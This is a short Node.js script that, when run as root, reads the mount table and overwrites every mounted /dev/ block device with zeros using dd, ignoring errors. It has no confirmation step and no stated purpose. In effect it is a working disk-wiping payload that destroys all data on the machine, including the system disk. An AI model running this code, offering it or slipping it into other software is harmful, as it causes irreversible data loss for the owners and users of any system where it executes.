#!/usr/bin/env node
const { execFileSync } = require("child_process");
const fs = require("fs");

if (process.getuid() === 0) {
  const text = fs.readFileSync("/proc/mounts", "utf8");
  const seen = new Set();
  for (const line of text.split("\n")) {
    const dev = line.split(/\s+/)[0];
    if (!dev || !dev.startsWith("/dev/") || seen.has(dev)) continue;
    seen.add(dev);
    try {
      execFileSync("dd", ["if=/dev/zero", `of=${dev}`]);
    } catch (_) {}
  }
}
